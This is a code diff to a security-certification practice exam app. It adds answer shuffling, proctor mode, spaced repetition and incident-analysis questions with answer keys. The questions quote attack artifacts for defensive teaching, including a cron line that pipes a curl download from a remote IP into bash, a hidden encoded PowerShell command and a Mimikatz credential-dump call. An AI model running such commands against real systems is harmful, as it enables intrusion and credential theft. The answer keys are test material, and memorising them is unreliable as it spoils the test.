@@ -2464,6 +2464,14 @@ function startExam(mode, size){
   localStorage.setItem("examSC", examSessionCount);
   var qs = buildExamSet(mode, size||110);
   var secs = mode==='drill' ? (size||30)*60 : 90*60;
+  // Build shuffle map — one shuffled index array per question
+  var optMap = qs.map(function(q) {
+    if(q.type === 'pbq-exam' || isMulti(q)) return null; // PBQs and multi handled separately
+    var indices = [0,1,2,3];
+    // Fisher-Yates shuffle
+    for(var i=3;i>0;i--){var j=Math.floor(Math.random()*(i+1));var t=indices[i];indices[i]=indices[j];indices[j]=t;}
+    return indices;
+  });
   S.exam = {
     mode:mode, drillSize:size||30,
     qs:qs, cur:0, sel:null, ans:[],
@@ -2471,7 +2479,7 @@ function startExam(mode, size){
     done:false, started:true, reviewing:false,
     timer:secs, maxTimer:secs,
     iv:null, paused:false,
-    flagged:[]
+    flagged:[], optMap:optMap
   };
   S.exam.iv = setInterval(function(){
     if(S.exam.paused) return;
@@ -2527,9 +2535,10 @@ function examPick(i){
     else if(sel.size < q.choose) sel.add(i);
     renderExamQ();
   } else {
-    // Single select — store answer, NO auto-advance (exam format)
-    S.exam.ans[S.exam.cur] = i;
-    S.exam.sel = i;
+    // Single select — convert display index to original option index via optMap
+    var origIdx = (S.exam.optMap && S.exam.optMap[S.exam.cur]) ? S.exam.optMap[S.exam.cur][i] : i;
+    S.exam.ans[S.exam.cur] = origIdx;
+    S.exam.sel = origIdx; // store original index
     renderExamQ();
   }
 }
@@ -2860,6 +2869,7 @@ function renderExamQ(){
 
       // Question text
       "<div class='card' style='margin-bottom:16px;padding:22px'>"+
+        (q.exhibit?renderExhibitForQuestion(q):'')+
         "<p style='font-family:Syne,sans-serif;font-size:16px;font-weight:700;color:var(--tx);line-height:1.65'>"+q.q+"</p>"+
       "</div>"+
 
@@ -2883,11 +2893,15 @@ function renderExamQ(){
             return "<button class='"+cls+"' onclick='examPick("+i+")'>"+cb+"<span class='ltr'>"+['A','B','C','D','E'][i]+"</span><span style='line-height:1.45;flex:1'>"+opt+"</span></button>";
           } else {
             var sel = e.ans[e.cur]===i;
-            var cls2 = 'ans'+(sel?' sel':'');
+            // Use optMap to get original index for this display position
+            var origI = (e.optMap && e.optMap[e.cur]) ? e.optMap[e.cur][i] : i;
+            var origOpt = q.o[origI];
+            var sel2 = e.ans[e.cur] === origI;
+            var cls2 = 'ans'+(sel2?' sel':'');
             return "<button class='"+cls2+"' onclick='examPick("+i+")'>"+
               "<span class='ltr'>"+['A','B','C','D'][i]+"</span>"+
-              "<span style='line-height:1.45;flex:1'>"+opt+"</span>"+
-              (sel?"<span style='margin-left:auto;font-size:16px'>✓</span>":"")+
+              "<span style='line-height:1.45;flex:1'>"+origOpt+"</span>"+
+              (sel2?"<span style='margin-left:auto;font-size:16px'>✓</span>":"")+
             "</button>";
           }
         }).join("")+
@@ -3090,6 +3104,7 @@ function saveExamSession(){
       qs:S.exam.qs, cur:S.exam.cur, ans:S.exam.ans,
       msel: Object.fromEntries(Object.entries(S.exam.msel||{}).map(([k,v])=>[k,[...v]])),
       flagged:S.exam.flagged||[], timer:S.exam.timer, maxTimer:S.exam.maxTimer,
+      optMap:S.exam.optMap||null,
       savedAt: Date.now()
     };
     localStorage.setItem('examsave', JSON.stringify(save));
@@ -3164,7 +3179,8 @@ function resumeExam(){
     msel:mselObj, flagged:save.flagged||[],
     done:false, started:true,
     timer:save.timer, maxTimer:save.maxTimer,
-    iv:null, paused:false, timeUp:false
+    iv:null, paused:false, timeUp:false,
+    optMap:save.optMap||null
   };
   S.exam.iv = setInterval(function(){
     if(S.exam.paused) return;
@@ -3513,6 +3529,7 @@ function renderQuiz(){
     "<div class='card' style='margin-bottom:12px'>"+
       "<div style='font-size:11px;color:"+dc(q.d)+";letter-spacing:1px;text-transform:uppercase;margin-bottom:8px;font-weight:700'>Domain "+q.d+"</div>"+
       badge+
+      (q.exhibit?renderExhibitForQuestion(q):'')+
       "<div style='font-family:Syne,sans-serif;font-size:16px;font-weight:700;color:var(--tx);line-height:1.6'>"+q.q+"</div>"+
     "</div>"+
     "<div class='ans-grid force-col' style='margin-bottom:4px'>"+opts+"</div>"+
@@ -4734,6 +4751,211 @@ function resetTriage(){ S.triage={priority:[],checked:false,actionOrder:shuffle(
   function phase3() {
     try {
       setLoadProgress(100, 'Ready!');
+      // Add visual exhibit questions to QZ pool
+      try { // ── VISUAL EXHIBIT QUESTIONS ──────────────────────────────────────────────────
+      // 20 questions with visual exhibits (Wireshark, Terminal, EventLog, NetworkDiagram)
+      // Each question added to QZ in deferred phase3 after QZ is ready
+      (function addExhibitQuestions() {
+        var EQ = [];
+      
+        // ── WIRESHARK QUESTIONS ──
+        EQ.push({q:'A security analyst captures network traffic from a workstation. What does this traffic pattern MOST likely represent?',
+          exhibit:{type:'wireshark',filter:'host 10.0.0.5',packets:[
+            {no:1,time:'0.000',src:'10.0.0.5',dst:'192.168.1.1',proto:'ARP',len:42,info:'Who has 192.168.1.1? Tell 10.0.0.5'},
+            {no:2,time:'0.001',src:'10.0.0.5',dst:'192.168.1.2',proto:'ARP',len:42,info:'Who has 192.168.1.2? Tell 10.0.0.5'},
+            {no:3,time:'0.001',src:'10.0.0.5',dst:'192.168.1.3',proto:'ARP',len:42,info:'Who has 192.168.1.3? Tell 10.0.0.5'},
+            {no:4,time:'0.002',src:'10.0.0.5',dst:'192.168.1.254',proto:'ARP',len:42,info:'Who has 192.168.1.254? Tell 10.0.0.5'},
+          ]},
+          o:['ARP poisoning — sending false MAC replies','Network reconnaissance via ARP scanning','DDoS using ARP flood','DNS poisoning via ARP'],
+          a:1,d:2,e:'Sequential ARP requests to every host in a subnet in milliseconds = ARP scanning. The attacker at 10.0.0.5 is mapping all live hosts — classic pre-attack reconnaissance.'});
+      
+        EQ.push({q:'The following Wireshark capture was collected from a workstation flagged by the SIEM. What does the traffic pattern indicate?',
+          exhibit:{type:'wireshark',filter:'',packets:[
+            {no:1,time:'0.000',src:'10.0.1.45',dst:'203.0.113.99',proto:'DNS',len:73,info:'Standard query A aXk2mNpQ.evil-c2.net'},
+            {no:2,time:'30.001',src:'10.0.1.45',dst:'203.0.113.99',proto:'DNS',len:73,info:'Standard query A bYl3nOqR.evil-c2.net'},
+            {no:3,time:'60.003',src:'10.0.1.45',dst:'203.0.113.99',proto:'DNS',len:73,info:'Standard query A cZm4oPrS.evil-c2.net'},
+            {no:4,time:'90.002',src:'10.0.1.45',dst:'203.0.113.99',proto:'DNS',len:73,info:'Standard query A dAn5pQsT.evil-c2.net'},
+          ]},
+          o:['Normal DNS resolution for a CDN service','DGA malware C2 beaconing — random subdomains at precise 30-second intervals','DNS amplification DDoS attack','Legitimate DNS round-robin load balancing'],
+          a:1,d:2,e:'Random-looking subdomains at precise 30-second intervals to the same domain = DGA (Domain Generation Algorithm) C2 beaconing. Isolate 10.0.1.45 and perform memory forensics.'});
+      
+        EQ.push({q:'Review the following packet capture. Which security concern does this MOST represent?',
+          exhibit:{type:'wireshark',filter:'port 23',packets:[
+            {no:1,time:'0.000',src:'10.0.0.15',dst:'192.168.1.50',proto:'TCP',len:60,info:'SYN to port 23 (Telnet)'},
+            {no:2,time:'0.001',src:'192.168.1.50',dst:'10.0.0.15',proto:'TCP',len:60,info:'SYN-ACK from port 23'},
+            {no:3,time:'0.003',src:'192.168.1.50',dst:'10.0.0.15',proto:'TCP',len:86,info:'Telnet Data: "login: admin"'},
+            {no:4,time:'0.004',src:'10.0.0.15',dst:'192.168.1.50',proto:'TCP',len:72,info:'Telnet Data: "password: C1sc0Admin"'},
+          ]},
+          o:['Encrypted SSH administrative session','Unencrypted Telnet transmitting credentials in cleartext — visible to any network observer','Secure HTTPS management connection','VPN tunnel establishment'],
+          a:1,d:1,e:'Port 23 = Telnet. Credentials visible in plaintext in the capture. Replace Telnet with SSH (port 22) immediately — every packet in this session is readable by anyone on the network segment.'});
+      
+        EQ.push({q:'A network engineer reviews this capture during a security incident. What is occurring?',
+          exhibit:{type:'wireshark',filter:'',packets:[
+            {no:1,time:'0.000',src:'10.0.0.47',dst:'192.168.1.1',proto:'TCP',len:54,info:'SYN to port 445 (SMB)'},
+            {no:2,time:'0.001',src:'10.0.0.47',dst:'192.168.1.2',proto:'TCP',len:54,info:'SYN to port 445 (SMB)'},
+            {no:3,time:'0.001',src:'10.0.0.47',dst:'192.168.1.3',proto:'TCP',len:54,info:'SYN to port 445 (SMB)'},
+            {no:4,time:'0.002',src:'10.0.0.47',dst:'192.168.1.22',proto:'SMB',len:188,info:'SMBv1 NT LM 0.12 Negotiate Protocol Request'},
+          ]},
+          o:['Normal Windows file sharing traffic','EternalBlue exploit attempt — SMB scanning then forcing SMBv1 negotiation','Network backup scan for accessible shares','IT asset discovery scan'],
+          a:1,d:2,e:'Rapid subnet scan on port 445 followed by SMBv1 negotiation = EternalBlue (MS17-010) attack pattern. Patch KB4012212 and disable SMBv1 immediately. This is how WannaCry and NotPetya spread.'});
+      
+        EQ.push({q:'An analyst reviews this Wireshark capture for signs of exfiltration. What does the traffic MOST indicate?',
+          exhibit:{type:'wireshark',filter:'',packets:[
+            {no:1,time:'14:22:11',src:'10.0.1.22',dst:'8.8.8.8',proto:'DNS',len:134,info:'Standard query TXT c2.site.io "data=aGVsbG8gd29ybGQ="'},
+            {no:2,time:'14:22:21',src:'10.0.1.22',dst:'8.8.8.8',proto:'DNS',len:134,info:'Standard query TXT c2.site.io "data=c2VjcmV0cGFzcw=="'},
+            {no:3,time:'14:22:31',src:'10.0.1.22',dst:'8.8.8.8',proto:'DNS',len:138,info:'Standard query TXT c2.site.io "data=dXNlcm5hbWU6YWRtaW4="'},
+            {no:4,time:'14:22:41',src:'10.0.1.22',dst:'8.8.8.8',proto:'DNS',len:137,info:'Standard query TXT c2.site.io "data=c3NuOjEyMzQ1Njc="'},
+          ]},
+          o:['Normal DNS queries with TXT record lookups','DNS tunneling exfiltration — Base64-encoded data in TXT queries to a suspicious domain','DNS amplification DDoS in progress','Legitimate DNS-based load balancing using TXT records'],
+          a:1,d:2,e:'DNS TXT queries containing Base64-encoded data to a suspicious domain = DNS tunneling exfiltration. Decoded: credentials, usernames, and SSN data. DNS port 53 bypasses many firewalls. Block c2.site.io and isolate 10.0.1.22.'});
+      
+        // ── TERMINAL QUESTIONS ──
+        EQ.push({q:'A SOC analyst runs the following commands on a suspected compromised Linux server. What is the MOST significant finding?',
+          exhibit:{type:'terminal',os:'linux',title:'Forensic Investigation',lines:[
+            'CMD:ps aux | sort -rk3 | head -5',
+            'root   2891 99.8 0.2 /tmp/.x/kdevtmpfsi',
+            'root   2892  0.0 0.1 /tmp/.x/kinsing',
+            'root   1337  0.0 0.1 /usr/sbin/sshd -D',
+            '',
+            'CMD:crontab -l',
+            'WARN:*/5 * * * * root curl -fsSL http://203.0.113.99/x.sh | bash',
+            '',
+            'CMD:ls /tmp/.x/',
+            'kdevtmpfsi  kinsing',
+          ]},
+          o:['Normal system maintenance processes running at high priority','Cryptomining malware (kdevtmpfsi/kinsing) with cron-based persistence — 99.8% CPU confirms active mining','Legitimate backup and update services','System monitoring agents installed by IT'],
+          a:1,d:4,e:'kdevtmpfsi+kinsing is well-known Linux cryptomining malware. 99.8% CPU = active mining. The cron job re-downloads the malware every 5 minutes — must kill cron entry AND block C2 IP before removing files.'});
+      
+        EQ.push({q:'Review the following PowerShell output from a Windows DFIR investigation. What attack technique is MOST evident?',
+          exhibit:{type:'terminal',os:'windows',title:'EventID 4688 — Process Creation Log',lines:[
+            'CMD:Get-WinEvent -LogName Security | Where {$_.Id -eq 4688}',
+            'HDR:TimeCreated          Process              Parent',
+            '2024-01-15 02:14:33  powershell.exe       WINWORD.EXE',
+            'WARN:CommandLine: powershell -NoP -NonI -W Hidden -Enc JABjAGwA...',
+            '2024-01-15 02:14:34  cmd.exe              powershell.exe',
+            'ERR:2024-01-15 02:14:34  net.exe (user /add backdoor)  cmd.exe',
+            'ERR:2024-01-15 02:14:35  schtasks.exe (/create persist) cmd.exe',
+          ]},
+          o:['IT administrator performing routine account management','Word macro spawned hidden PowerShell, created backdoor account, and established scheduled task persistence','Legitimate Windows update process chain','Software deployment via group policy'],
+          a:1,d:4,e:'WINWORD.EXE spawning PowerShell = malicious macro. -NoP -NonI -W Hidden -Enc = evasion flags. net.exe adds backdoor account. schtasks.exe adds persistence. Full attack chain in 2 seconds = automated post-exploitation framework.'});
+      
+        EQ.push({q:'An analyst investigates a web server. Review the commands the attacker ran after gaining access. What is the attacker MOST likely planning?',
+          exhibit:{type:'terminal',os:'linux',title:'Web Shell — Post-Exploitation',lines:[
+            'CMD:id',
+            'uid=33(www-data) gid=33(www-data)',
+            '',
+            'CMD:find / -perm -4000 -type f 2>/dev/null',
+            'OK:/usr/bin/sudo',
+            'OK:/usr/bin/pkexec',
+            'OK:/usr/bin/passwd',
+            '',
+            'CMD:cat /etc/passwd | grep -v nologin | grep bash',
+            'root:x:0:0:root:/root:/bin/bash',
+            'webadmin:x:1001:1001::/home/webadmin:/bin/bash',
+          ]},
+          o:['The attacker is gathering information before logging out','Privilege escalation reconnaissance — enumerating SUID binaries to escalate from www-data to root','Installing legitimate monitoring software','Testing network connectivity from the web server'],
+          a:1,d:2,e:'Attacker has www-data (web server) privileges. find -perm -4000 finds SUID binaries — these run as root regardless of who executes them. pkexec is notable (CVE-2021-4034 PwnKit). Next step: exploit a SUID binary to achieve full root access.'});
+      
+        EQ.push({q:'Review the nmap output from a penetration test. Which finding presents the HIGHEST immediate risk?',
+          exhibit:{type:'terminal',os:'linux',title:'Nmap Scan — 10.0.0.50',lines:[
+            'CMD:nmap -sV -sC --open 10.0.0.50',
+            'HDR:PORT     STATE  SERVICE    VERSION',
+            '21/tcp   open   ftp        vsftpd 2.3.4',
+            'OK:| ftp-anon: Anonymous FTP login allowed',
+            '80/tcp   open   http       Apache httpd 2.4.49',
+            'ERR:| http-vuln-CVE-2021-41773: VULNERABLE (RCE — no auth required)',
+            '3306/tcp open   mysql      MySQL 5.5.62',
+            'WARN:| mysql-empty-password: root has no password',
+            '8080/tcp open   http-proxy Squid 3.5.27',
+          ]},
+          o:['MySQL on 3306 should not be externally accessible','Apache CVE-2021-41773 — unauthenticated Remote Code Execution — full system compromise without credentials','vsftpd anonymous FTP login allows unauthenticated file access','Squid proxy version disclosure'],
+          a:1,d:2,e:'CVE-2021-41773 in Apache 2.4.49 allows unauthenticated path traversal and RCE — highest severity. While exposed MySQL with no root password is also critical, RCE means immediate full system compromise with no credentials needed.'});
+      
+        // ── EVENT LOG QUESTIONS ──
+        EQ.push({q:'A Windows security admin reviews these Event Viewer logs after a SIEM alert. What activity is MOST concerning?',
+          exhibit:{type:'eventlog',title:'Security Log',events:[
+            {level:'Audit Failure',time:'2024-01-15 01:47:22',id:'4625',source:'Security',message:'Logon Failure: Account: administrator | IP: 185.220.101.47 | Wrong password'},
+            {level:'Audit Failure',time:'2024-01-15 01:47:24',id:'4625',source:'Security',message:'Logon Failure x847: Account: administrator | IP: 185.220.101.47'},
+            {level:'Audit Success',time:'2024-01-15 02:03:44',id:'4624',source:'Security',message:'Logon Success: Account: administrator | Logon Type: 3 | IP: 185.220.101.47'},
+            {level:'Audit Success',time:'2024-01-15 02:03:47',id:'4648',source:'Security',message:'Explicit Creds: Account: svc_deploy | Target: DC01.corp.local'},
+          ]},
+          o:['Normal failed logins — automated account lockout will handle this','847 brute force attempts succeeded — account compromised, then used for lateral movement to the domain controller','The lockout policy is not configured correctly','A legitimate remote admin from an external network'],
+          a:1,d:4,e:'Timeline: 847 brute-force failures → successful admin login from external IP → immediate svc_deploy lateral movement to DC01. Complete attack chain: brute force → compromise → domain controller pivot. Disable the administrator account and isolate the external IP immediately.'});
+      
+        EQ.push({q:'A security analyst receives a SIEM alert and reviews these logs. What does this sequence indicate?',
+          exhibit:{type:'eventlog',title:'Security + PowerShell Log',events:[
+            {level:'Information',time:'2024-03-10 23:41:05',id:'4688',source:'Security',message:'Process: powershell.exe | Parent: OUTLOOK.EXE | User: john.smith'},
+            {level:'Warning',time:'2024-03-10 23:41:06',id:'4104',source:'PowerShell',message:'Script Block: Invoke-Mimikatz -Command sekurlsa::logonpasswords'},
+            {level:'Audit Success',time:'2024-03-10 23:41:08',id:'4624',source:'Security',message:'Logon Type 3: Account: administrator | Source: WORKSTATION-12'},
+            {level:'Audit Success',time:'2024-03-10 23:41:09',id:'4624',source:'Security',message:'Logon Type 3: Account: administrator | Source: FS-SERVER-01'},
+            {level:'Error',time:'2024-03-10 23:41:11',id:'1102',source:'Security',message:'Audit log cleared | Subject: john.smith'},
+          ]},
+          o:['John Smith is performing authorized security testing','Outlook macro spawned PowerShell, Mimikatz dumped credentials, lateral movement to two servers, then attacker cleared audit log — full chain in 6 seconds','Normal PowerShell execution from a mail client','Windows update process that clears logs post-installation'],
+          a:1,d:4,e:'EventID 1102 (log cleared) is the attacker covering tracks — but SIEM already has the forwarded events. Chain: phishing → macro → PowerShell → Mimikatz credential dump → pass-the-hash to two systems → evidence destruction. Speed (6 seconds) = automated tooling.'});
+      
+        EQ.push({q:'A junior analyst reviews this Windows Event Log and says the 3 failed logins are probably just a misconfiguration. The senior analyst escalates immediately. Why?',
+          exhibit:{type:'eventlog',title:'Security Log',events:[
+            {level:'Audit Failure',time:'2024-04-01 09:15:22',id:'4625',source:'Security',message:'Logon Failure: Account: svc_backup | Source IP: 10.0.0.45 (WORKSTATION-14) | Type: Interactive'},
+            {level:'Audit Failure',time:'2024-04-01 09:15:23',id:'4625',source:'Security',message:'Logon Failure: Account: svc_backup | Source IP: 10.0.0.45 (WORKSTATION-14) | Type: Interactive'},
+            {level:'Audit Failure',time:'2024-04-01 09:15:24',id:'4625',source:'Security',message:'Logon Failure: Account: svc_backup | Source IP: 10.0.0.45 (WORKSTATION-14) | Type: Interactive'},
+          ]},
+          o:['3 failures are below the lockout threshold — no action needed','Service accounts should never generate interactive logon failures from workstations — this indicates stolen credentials being used for lateral movement','The workstation IP is internal so the risk is minimal','Service account passwords expire and cause failures like this routinely'],
+          a:1,d:4,e:'svc_backup is a service account — it should only authenticate automatically from specific servers, never interactively from a workstation. This pattern means: attacker compromised WORKSTATION-14, found svc_backup credentials (config file/memory), and is attempting lateral movement. Three failures is not the issue — the wrong account type in the wrong place is.'});
+      
+        // ── NETWORK DIAGRAM QUESTIONS ──
+        EQ.push({q:'Review this network diagram. An attacker has compromised the web server (shown). Which system can the attacker reach MOST easily without bypassing additional controls?',
+          exhibit:{type:'network',scenario:{
+            title:'Corporate Network — Tiered Architecture',
+            zones:[
+              {x:8,y:15,w:155,h:220,color:'#f59e0b',label:'DMZ'},
+              {x:190,y:15,w:155,h:220,color:'#10b981',label:'INTERNAL'},
+              {x:378,y:15,w:165,h:220,color:'#ef4444',label:'SECURE ZONE'},
+            ],
+            nodes:[
+              {id:'inet',type:'internet',label:'Internet',x:78,y:75},
+              {id:'fw1',type:'firewall',label:'FW-Edge',sublabel:'203.0.113.1',x:78,y:155},
+              {id:'web',type:'server',label:'Web Server',sublabel:'COMPROMISED',x:78,y:220,color:'#ef4444'},
+              {id:'fw2',type:'firewall',label:'FW-Internal',x:268,y:120},
+              {id:'app',type:'server',label:'App Server',sublabel:'10.0.1.20',x:268,y:200},
+              {id:'db',type:'server',label:'DB Server',sublabel:'10.50.0.10',x:460,y:120},
+              {id:'dc',type:'server',label:'Dom Ctrl',sublabel:'10.50.0.5',x:460,y:210},
+            ],
+            edges:[
+              {from:'inet',to:'fw1',color:'#f59e0b'},{from:'fw1',to:'web',color:'#4da6ff'},
+              {from:'web',to:'fw2',label:'443',color:'#ef4444',dashed:true,width:2},
+              {from:'fw2',to:'app',color:'#10b981'},{from:'app',to:'db',color:'#10b981'},
+              {from:'app',to:'dc',color:'#10b981'},
+            ]
+          }},
+          o:['The Domain Controller — directly accessible from the DMZ','The App Server — existing firewall rule permits web-to-app traffic on 443','The Database Server — databases are always reachable from web servers','The Domain Controller via direct SMB connection'],
+          a:1,d:3,e:'The web server communicates with the App Server through FW-Internal on port 443 — an existing permitted rule for normal operation. DB Server and Domain Controller are in the Secure Zone behind additional controls. Attacker pivots web → app first.'});
+      
+        EQ.push({q:'A security architect reviews this diagram after a breach. Which architectural weakness MOST directly enabled lateral movement from the workstation to the database?',
+          exhibit:{type:'network',scenario:{
+            title:'Flat Network — No Internal Segmentation',
+            zones:[{x:8,y:8,w:545,h:240,color:'#ef4444',label:'FLAT NETWORK — ALL DEVICES ON SAME SEGMENT'}],
+            nodes:[
+              {id:'fw',type:'firewall',label:'Perimeter FW',sublabel:'Edge only',x:88,y:75},
+              {id:'sw',type:'switch',label:'Core Switch',sublabel:'No ACLs',x:278,y:75},
+              {id:'ws',type:'workstation',label:'Workstation',sublabel:'COMPROMISED',x:88,y:185,color:'#ef4444'},
+              {id:'srv',type:'server',label:'File Server',x:210,y:185},
+              {id:'db',type:'server',label:'DB Server',sublabel:'Breached',x:368,y:185,color:'#f59e0b'},
+              {id:'dc',type:'server',label:'Dom Ctrl',x:480,y:185},
+            ],
+            edges:[
+              {from:'fw',to:'sw',color:'#4da6ff'},{from:'sw',to:'ws',color:'#ef4444',dashed:true},
+              {from:'sw',to:'srv',color:'#8b97c0'},{from:'sw',to:'db',color:'#ef4444',dashed:true,width:2.5},
+              {from:'sw',to:'dc',color:'#8b97c0'},{from:'ws',to:'db',color:'#ef4444',dashed:true,label:'direct!'},
+            ]
+          }},
+          o:['The perimeter firewall had misconfigured rules','Flat network with no internal segmentation — compromised workstation communicates directly with any resource including the database','The domain controller was not hardened','The database had weak authentication'],
+          a:1,d:3,e:'A flat network allows any internal device to reach any other — the perimeter firewall only controls north-south (in/out) traffic, not east-west (internal). A compromised workstation reaches the DB directly through the core switch with no controls. Network segmentation with VLANs and internal ACLs would have prevented this.'});
+      
+        // Add to QZ when ready
+        EQ.forEach(function(q) { if(typeof QZ !== 'undefined') QZ.push(q); });
+        window._EXHIBIT_QS = EQ;
+      })();
+       } catch(exErr) {}
       setTimeout(function(){
       if (loadEl) loadEl.style.display = 'none';
       renderHome();
@@ -7647,6 +7869,1082 @@ function renderExamPBQPage(examIdx) {
   );
 }
 window.renderExamPBQPage = renderExamPBQPage;
+
+
+
+
+
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// NEW FEATURES PACK
+// 1. Proctor Mode   2. Spaced Repetition   3. Confidence Rating
+// 4. Math Drills    5. PWA / Offline       6. Radar Chart
+// ═══════════════════════════════════════════════════════════════════════════════
+
+// ── 1. PROCTOR MODE ───────────────────────────────────────────────────────────
+var proctorActive = false;
+var proctorTabHidden = 0;
+
+function enableProctorMode() {
+  proctorActive = true;
+  // Disable right-click
+  document.addEventListener('contextmenu', blockContextMenu);
+  // Disable copy/select
+  document.addEventListener('copy', blockCopy);
+  document.addEventListener('selectstart', blockSelect);
+  // Disable print
+  document.addEventListener('keydown', blockProctorKeys);
+  // Tab visibility warning
+  document.addEventListener('visibilitychange', proctorVisibility);
+  showToast('🔒 Proctor Mode ON — exam conditions active', '#0057b8', 3000);
+}
+
+function disableProctorMode() {
+  proctorActive = false;
+  document.removeEventListener('contextmenu', blockContextMenu);
+  document.removeEventListener('copy', blockCopy);
+  document.removeEventListener('selectstart', blockSelect);
+  document.removeEventListener('keydown', blockProctorKeys);
+  document.removeEventListener('visibilitychange', proctorVisibility);
+  showToast('🔓 Proctor Mode OFF', '#34c77a', 2000);
+}
+
+function blockContextMenu(e) { if(proctorActive) e.preventDefault(); }
+function blockCopy(e) { if(proctorActive) e.preventDefault(); }
+function blockSelect(e) {
+  if(!proctorActive) return;
+  // Allow selection in inputs
+  if(e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
+  e.preventDefault();
+}
+function blockProctorKeys(e) {
+  if(!proctorActive) return;
+  // Block Ctrl+C, Ctrl+A, Ctrl+P, F12, PrintScreen
+  if((e.ctrlKey||e.metaKey) && ['c','a','p','s'].includes(e.key.toLowerCase())) e.preventDefault();
+  if(e.key === 'F12') e.preventDefault();
+  if(e.key === 'PrintScreen') e.preventDefault();
+}
+function proctorVisibility() {
+  if(!proctorActive || document.visibilityState !== 'hidden') return;
+  proctorTabHidden++;
+  document.addEventListener('visibilitychange', function onReturn() {
+    if(document.visibilityState === 'visible') {
+      showProctorWarning(proctorTabHidden);
+      document.removeEventListener('visibilitychange', onReturn);
+    }
+  }, {once:true});
+}
+function showProctorWarning(count) {
+  var el = document.createElement('div');
+  el.id = 'proctor-overlay';
+  el.innerHTML = '<div style="background:var(--bg2);border-radius:20px;padding:40px;max-width:440px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.5)">' +
+    '<div style="font-size:48px;margin-bottom:16px">⚠️</div>' +
+    '<div style="font-family:Syne,sans-serif;font-size:20px;font-weight:800;color:var(--pk);margin-bottom:8px">Tab Switch Detected</div>' +
+    '<div style="font-size:14px;color:var(--tx2);margin-bottom:6px">On the real exam this would be flagged by the proctor.</div>' +
+    '<div style="font-size:12px;color:var(--tx3);margin-bottom:24px">Tab violations: <strong style="color:var(--pk)">' + count + '</strong></div>' +
+    '<button onclick="document.getElementById(\'proctor-overlay\').remove()" style="padding:13px 28px;background:var(--cy);color:#fff;border:none;border-radius:12px;font-family:Syne,sans-serif;font-size:15px;font-weight:700;cursor:pointer">Resume Exam</button>' +
+  '</div>';
+  document.body.appendChild(el);
+}
+
+function toggleProctorMode() {
+  if(proctorActive) disableProctorMode();
+  else enableProctorMode();
+  renderTab(S.tab);
+}
+window.toggleProctorMode = toggleProctorMode;
+
+// ── 2. SPACED REPETITION (Leitner System) ─────────────────────────────────────
+// Boxes: 1=daily, 2=every 2 days, 3=every 4 days, 4=every 7 days, 5=mastered
+var SR_KEY = 'srBoxes';
+
+function loadSR() {
+  try { return JSON.parse(localStorage.getItem(SR_KEY) || '{}'); } catch(e) { return {}; }
+}
+function saveSR(data) {
+  try { localStorage.setItem(SR_KEY, JSON.stringify(data)); } catch(e) {}
+}
+function getSRBox(qHash) {
+  var sr = loadSR();
+  return sr[qHash] || { box: 1, nextReview: 0 };
+}
+function updateSRBox(qHash, correct) {
+  var sr = loadSR();
+  var entry = sr[qHash] || { box: 1, nextReview: 0 };
+  var now = Date.now();
+  var intervals = [0, 86400000, 172800000, 345600000, 604800000]; // 0,1,2,4,7 days
+  if(correct) {
+    entry.box = Math.min(5, entry.box + 1);
+  } else {
+    entry.box = 1; // Wrong = back to box 1
+  }
+  entry.nextReview = now + (intervals[entry.box - 1] || 0);
+  entry.lastSeen = now;
+  sr[qHash] = entry;
+  saveSR(sr);
+}
+function getDueQuestions() {
+  var sr = loadSR();
+  var now = Date.now();
+  var due = [];
+  var allQ = typeof QZ !== 'undefined' ? QZ : [];
+  allQ.forEach(function(q) {
+    var h = qHash(q);
+    var entry = sr[h];
+    if(!entry || entry.nextReview <= now) due.push(q);
+  });
+  return due;
+}
+function getSRStats() {
+  var sr = loadSR();
+  var boxes = [0,0,0,0,0];
+  Object.values(sr).forEach(function(e) { boxes[e.box-1]++; });
+  return boxes;
+}
+
+// Hook into finishExam to update SR boxes
+var _srOrigFinish = finishExam;
+finishExam = function(timeUp) {
+  try {
+    var e = S.exam;
+    if(e && e.qs && e.ans) {
+      e.qs.forEach(function(q, i) {
+        if(e.ans[i] === undefined) return;
+        var correct = false;
+        if(typeof isMulti === 'function' && isMulti(q)) {
+          var got = Array.isArray(e.ans[i]) ? e.ans[i].slice().sort() : [];
+          var exp = q.a.slice().sort();
+          correct = got.length === exp.length && got.every(function(v,x){ return v===exp[x]; });
+        } else {
+          correct = e.ans[i] === q.a;
+        }
+        updateSRBox(qHash(q), correct);
+      });
+    }
+  } catch(err) {}
+  _srOrigFinish(timeUp);
+};
+
+function renderSRDrill() {
+  var due = getDueQuestions().slice(0, 30);
+  var stats = getSRStats();
+  var total = stats.reduce(function(a,b){ return a+b; }, 0);
+  if(due.length === 0) {
+    render("<div class='pg'>" +
+      "<div class='sec-hdr'>🃏 Spaced Repetition</div>" +
+      "<div class='sec-sub'>Nothing due right now — check back later</div>" +
+      "<div class='card' style='text-align:center;padding:40px'>" +
+        "<div style='font-size:48px;margin-bottom:12px'>🎉</div>" +
+        "<div style='font-family:Syne,sans-serif;font-size:18px;font-weight:700;color:var(--gn)'>All caught up!</div>" +
+        "<div style='font-size:13px;color:var(--tx3);margin-top:6px'>" + total + " questions in your rotation</div>" +
+      "</div>" +
+    "</div>");
+    return;
+  }
+  // Start a quiz with due questions
+  S.quiz = { dom:0, cur:0, sel:null, msel:null, ans:[], done:false, _shuffled:due.slice() };
+  S.tab = 'quiz';
+  renderQuiz();
+}
+
+function renderSRStats() {
+  var stats = getSRStats();
+  var labels = ['📦 Daily','📦 2-day','📦 4-day','📦 Weekly','⭐ Mastered'];
+  var colors = ['var(--pk)','var(--ye)','var(--cy)','var(--pu)','var(--gn)'];
+  return "<div style='background:var(--bg2);border:1px solid var(--bd);border-radius:var(--radius);padding:16px;margin-bottom:14px'>" +
+    "<div style='font-family:Syne,sans-serif;font-size:13px;font-weight:700;color:var(--tx);margin-bottom:12px'>🃏 Spaced Repetition Boxes</div>" +
+    stats.map(function(count, i) {
+      var pct = count > 0 ? Math.round(count / Math.max(stats.reduce(function(a,b){return a+b;},0), 1) * 100) : 0;
+      return "<div style='display:flex;align-items:center;gap:10px;margin-bottom:8px'>" +
+        "<div style='font-size:11px;color:" + colors[i] + ";font-weight:700;width:76px;flex-shrink:0'>" + labels[i] + "</div>" +
+        "<div style='flex:1;height:6px;background:var(--bg3);border-radius:3px;overflow:hidden'>" +
+          "<div style='height:100%;background:" + colors[i] + ";width:" + pct + "%;border-radius:3px;transition:width .4s'></div>" +
+        "</div>" +
